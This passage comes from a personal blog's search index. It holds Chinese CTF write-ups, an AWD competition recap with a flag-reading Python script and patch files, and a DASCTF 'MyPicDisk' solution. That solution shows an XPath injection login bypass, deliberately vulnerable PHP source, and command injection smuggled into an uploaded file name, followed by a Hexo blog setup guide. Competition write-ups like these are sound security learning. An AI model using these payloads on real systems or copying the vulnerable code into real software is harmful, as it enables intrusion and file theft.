/flag&#x27;&#125;url2=f&quot;http://&#123;HOST&#125;:&#123;PORT&#125;/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;try: a=requests.post(target,data=data) print(find_flag(a.text))except Exception as e: a=requests.post(url2) print((str(a.text)[-43:-1])) patch也贴上 patch.sh 123#!/bin/bashpython3 patch.py cp index.class.php /var/www/html/controller/index.class.php index.class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpclass indexController extends medoo&#123; function index() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; case &#x27;yestoday&#x27;: $datas[&#x27;time&#x27;] = &#x27;yestoday&#x27;; break; case &#x27;before&#x27;: $datas[&#x27;time&#x27;] = &#x27;before&#x27;; break; default: $datas[&#x27;time&#x27;] = &#x27;today&#x27;; break; &#125; $datas[&#x27;title&#x27;] = &#x27;ASHOP&#x27;; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $user_data = array(); $user_data[&#x27;time&#x27;] = time(); $user_data[&#x27;ip&#x27;] = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; setcookie(&quot;AshopToken&quot;, base64_encode(serialize($user_data))); $this-&gt;display($datas); &#125; function cat() &#123; $catid = get(&#x27;id&#x27;); $datas[&#x27;title&#x27;] = &#x27;cat | ASHOP&#x27;; $datas[&#x27;catid&#x27;] = $catid; $database = new index(); $datas[&#x27;cats&#x27;] = $database-&gt;get_cats(); $this-&gt;display($datas); &#125; function more() &#123; $date = get(&#x27;time&#x27;); switch ($date) &#123; case &#x27;today&#x27;: $time = date(&#x27;Y-m-d&#x27;, time()); break; case &#x27;yestoday&#x27;: $time = date(&#x27;Y-m-d&#x27;, strtotime(&#x27;-1 day&#x27;)); break; case &#x27;before&#x27;: $time = date(&#x27;Y-m-d&#x27;, strtotime(&#x27;-2 day&#x27;)); break; &#125; $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;get_contents($time); $data = $datas[&#x27;contents&#x27;]; $result = $database-&gt;get_more($data); echo $result; &#125; function cat_more() &#123; $catid = get(&#x27;id&#x27;); $database = new index(); $datas[&#x27;contents&#x27;] = $database-&gt;cat_contents($catid); $data = $datas[&#x27;contents&#x27;]; //print_r($data); $result = $database-&gt;get_more($data); echo $result; &#125; function show_pic() &#123; $pic = get(&#x27;file&#x27;); if (strpos($pic, &quot;flag&quot;) !== false) &#123; $pic = &#x27;&#x27;; &#125; if ($pic != null) &#123; header(&quot;Content-type:image/jpeg&quot;); echo file_get_contents($pic); &#125; &#125;&#125; patch.py 123456789import osfile_path = &quot;/var/www/html/config/config.php&quot;try: os.remove(file_path) print(f&quot;File &#123;file_path&#125; has been successfully deleted.&quot;)except OSError as e: print(f&quot;Error deleting &#123;file_path&#125;: &#123;e&#125;&quot;) 应急响应考察更多的是一些木马和勒索病毒的知识，模式与ctf答题模式差不多，只不过每道题给分是固定的。 总结第一次打 dawd 模式，感觉 dawd 是 awd 的简化版，没有不死马这种一次打中每次都能拿分的骚操作，更加考验大家写脚本的速度和熟练度。 比赛有点水，主要靠dawd攻防拉分，因为我们队第三轮就开始拿分，等别的队伍开始拿分的时候就已经甩开好多分数了。 应急响应最后只差3道题没答上来，我没做几道题，主要靠队友c，队友tql。","categories":[{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/categories/awd/"}],"tags":[{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/tags/awd/"}]},{"title":"[DASCTF 2023 & 0X401七月暑期挑战赛] MyPicDisk","slug":"2023dasctf_MyPicDisk","date":"2023-07-27T14:30:16.000Z","updated":"2023-10-06T06:16:59.077Z","comments":true,"path":"2023/07/27/2023dasctf_MyPicDisk/","link":"","permalink":"https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/","excerpt":"","text":"过程开启容器，发现以下表单，表单信息通过post方法传送 通过xpath万能注入 1username=admin&#x27;&amp;password=&#x27;]|//*|//*[&#x27;&amp;submit=%E7%99%BB%E5%BD%95 注入成功，burp观察返回包发现注释信息获得提示下载源码&#x2F;y0u_cant_find_1t.zip 得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&lt;?phpsession_start();error_reporting(0);class FILE&#123; public $filename; public $lasttime; public $size; public function __construct($filename) &#123; if (preg_match(&quot;/\\//i&quot;, $filename)) &#123; throw new Error(&quot;hacker!&quot;); &#125; $num = substr_count($filename, &quot;.&quot;); if ($num != 1) &#123; throw new Error(&quot;hacker!&quot;); &#125; if (!is_file($filename)) &#123; throw new Error(&quot;???&quot;); &#125; $this-&gt;filename = $filename; $this-&gt;size = filesize($filename); $this-&gt;lasttime = filemtime($filename); &#125; public function remove() &#123; unlink($this-&gt;filename); &#125; public function show() &#123; echo &quot;Filename: &quot; . $this-&gt;filename . &quot; Last Modified Time: &quot; . $this-&gt;lasttime . &quot; Filesize: &quot; . $this-&gt;size . &quot;&lt;br&gt;&quot;; &#125; public function __destruct() &#123; system(&quot;ls -all &quot; . $this-&gt;filename); &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;MyPicDisk&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!isset($_SESSION[&#x27;user&#x27;])) &#123; echo &#x27;&lt;form method=&quot;POST&quot;&gt; username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt; password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;&#x27;; $xml = simplexml_load_file(&#x27;/tmp/secret.xml&#x27;); if ($_POST[&#x27;submit&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = md5($_POST[&#x27;password&#x27;]); $x_query = &quot;/accounts/user[username=&#x27;&#123;$username&#125;&#x27; and password=&#x27;&#123;$password&#125;&#x27;]&quot;; $result = $xml-&gt;xpath($x_query); if (count($result) == 0) &#123; echo &#x27;登录失败&#x27;; &#125; else &#123; $_SESSION[&#x27;user&#x27;] = $username; echo &quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; &#125; &#125; else &#123; if ($_SESSION[&#x27;user&#x27;] !== &#x27;admin&#x27;) &#123; echo &quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;; unset($_SESSION[&#x27;user&#x27;]); echo &quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; echo &quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;; if (!$_GET[&#x27;file&#x27;]) &#123; foreach (scandir(&quot;.&quot;) as $filename) &#123; if (preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123; echo &quot;&lt;a href=&#x27;index.php/?file=&quot; . $filename . &quot;&#x27;&gt;&quot; . $filename . &quot;&lt;/a&gt;&lt;br&gt;&quot;; &#125; &#125; echo &#x27; &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt; &#x27;; if ($_FILES[&#x27;file&#x27;]) &#123; $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (!preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123; die(&quot;hacker!&quot;); &#125; if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $filename)) &#123; echo &quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; else &#123; die(&#x27;failed&#x27;); &#125; &#125; &#125; else &#123; $filename = $_GET[&#x27;file&#x27;]; if ($_GET[&#x27;todo&#x27;] === &quot;md5&quot;) &#123; echo md5_file($filename); &#125; else &#123; $file = new FILE($filename); if ($_GET[&#x27;todo&#x27;] !== &quot;remove&quot; &amp;&amp; $_GET[&#x27;todo&#x27;] !== &quot;show&quot;) &#123; echo &quot;&lt;img src=&#x27;../&quot; . $filename . &quot;&#x27;&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;; &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;remove&quot;) &#123; $file-&gt;remove(); echo &quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;show&quot;) &#123; $file-&gt;show(); &#125; &#125; &#125; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 分析源码，发现有文件上传白名单（jpg|jpeg|gif|png|bmp后缀名） 继续分析，发现class FILE的system(&quot;ls -all &quot; . $this-&gt;filename);处存在命令拼接 但是有条件，必须保证文件名有且只有一个.，并且不能含有\\/ 接下来想方法绕过 首先上传文件1111.jpg，文件内容为ls /用来查看根目录flag文件名 接下来上传名为;`cat 111*`;1.jpg的文件再进行?filename=;`cat 111*`;1.jpg&amp;todo=show，发现成功执行了命令，返回得到flag路径adjaskdhnask_flag_is_here_dakjdnmsakjnfksd 最后更换文件内容为cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd，再次执行命令得到flag 原理xpath注入题目中xpath查询语句拼接后为 1/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;] 其实后面不重要，因为admin的引号已经将查询语句闭合了 相当于 1/accounts/user[username=&#x27;admin&#x27;] 于是相当于查询是否有admin账户，得到结果 rce;可以分隔一串命令 `Linux中反引号的作用是在将反引号内的命令处理完毕之后，会将返回的信息传给反引号的位置，再次执行命令 后记看了网上好多wp，发现我的做法貌似是非预期 预期解是md5_file函数结合phar打的 太菜了太菜了，别的题目为什么不写wp，因为都不会。。。。。","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"xpath注入","slug":"xpath注入","permalink":"https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"},{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"},{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"使用hexo框架搭建github静态博客","slug":"hexo","date":"2023-06-30T07:26:57.000Z","updated":"2023-06-30T08:41:41.280Z","comments":true,"path":"2023/06/30/hexo/","link":"","permalink":"https://blog.lazyforever.top/2023/06/30/hexo/","excerpt":"","text":"第一次使用 hexo 搭建静态网站，踩了好多坑，立此贴记录一下 本地配置Hexo安装NodejsNodejs官方地址 从以上链接下载 nodejs 安装（官网下载稍慢，建议翻墙） 设置npm淘宝镜像站npm 默认的源的下载速度可能很慢，建议使用淘宝镜像替换。执行下面的命令，将 npm 的源设置成淘宝镜像站。 1npm config set registry &quot;https://registry.npm.taobao.org&quot; 安装gitgit官方链接 从以上链接下载 git 安装 一路确认，安装时要勾选 Add to PATH 选项 验证cmd 输入以下命令观察是否执行正确 12git --versionnpm -v 初始化Hexo执行以下命令安装 hexo 1npm install hexo-cli g 在电脑的某个磁盘或路径新建一个文件夹(名字可以随便取)，比如我的是 D:\\blog，由于这个文件夹将来就作为您存放博客的地方，所以最好不要随便放 在 D:\\blog 文件夹下右键打开 Git Bash Here，输入命令: hexo init 进行初始化 hexo 会自动下载一些文件到这个目录 接着在 cmd 中安装其他 hexo 插件 123456789npm installnpm install hexo-server --savenpm install hexo-admin --savenpm install hexo-generator-archive --savenpm install hexo-generator-feed --savenpm install hexo-generator-search --savenpm install hexo-generator-tag --savenpm install hexo-deployer-git --savenpm install hexo-generator-sitemap --save 至此，本地 hexo 配置完毕。 现在可以使用 hexo 搭建本地服务器来使用 使用 hexo g 生成静态页面，使用 hexo s 开启本地服务器，接下来可以用浏览器地址栏输入 localhost:4000 来看见刚刚创建的博客 部署github配置 Github注册 github 账号，并在主页创建仓库，名字为 [yourname].github.io 配置ssh打开git bash终端设置 user.name 和 user.email 12git config --global user.name &quot;你的GitHub用户名&quot;git config --global user.email &quot;你的GitHub注册邮箱&quot; 生成ssh密匙 1ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot; 将公匙添加到 github 上 将hexo博客部署到github上修改配置文件 blog&#x2F;_config.yml，修改deploy项的内容，如下所示： 注意： 分支（branch）要与自己创建仓库的分支名称一致（注意master与main的区别） 冒号后面必须添加一个空格 保持缩进格式一致 给出示例： 123456# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: - type: git repo: https://github.com/lazy-forever/lazy-forever.github.io.git branch: main 部署hexo输入下面的命令将hexo博客部署到github中： 123hexo cl #清理之前生成的文件hexo g #生成静态页面hexo d #部署 隔一段时间后打开浏览器，输入 [yourname].github.io 即可看到我们部署的博客 关于翻墙众所周知，中国大陆境内对于 github 的访问一直处于时常能连上时常连不上的状态，因此如果我们在执行 hexo d 命令时翻墙，会让部署的过程更加丝滑。 我的电脑一直在使用 clash 进行翻墙，而在 cmd 中使用hexo d时，clash 必须用以管理员身份打开并开启增强功能，如图：","categories":[{"name":"博客","slug":"博客","permalink":"https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"技术","slug":"技术","permalink":"https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"My First Blog","slug":"hello-world","date":"2023-05-29T10:00:00.000Z","updated":"2023-05-31T15:54:21.269Z","comments":true,"path":"2023/05/29/hello-world/","link":"","permalink":"https://blog.lazyforever.top/2023/05/29/hello-world/","excerpt":"","text":"这是我的第一篇博客。","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/categories/awd/"},{"name":"博客","slug":"博客","permalink":"https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"},{"name":"reverse","slug":"reverse","permalink":"https://blog.lazyforever.top/tags/reverse/"},{"name":"misc","slug":"misc","permalink":"https://blog.lazyforever.top/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://blog.lazyforever.top/tags/pwn/"},{"name":"crypto","slug":"crypto","permalink":"https://blog.lazyforever.top/tags/crypto/"},{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/tags/awd/"},{"name":"xpath注入","slug":"xpath注入","permalink":"https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"},{"name":"技术","slug":"技术","permalink":"https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"},{"name":"其他","slug":"其他","permalink":"https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"}]}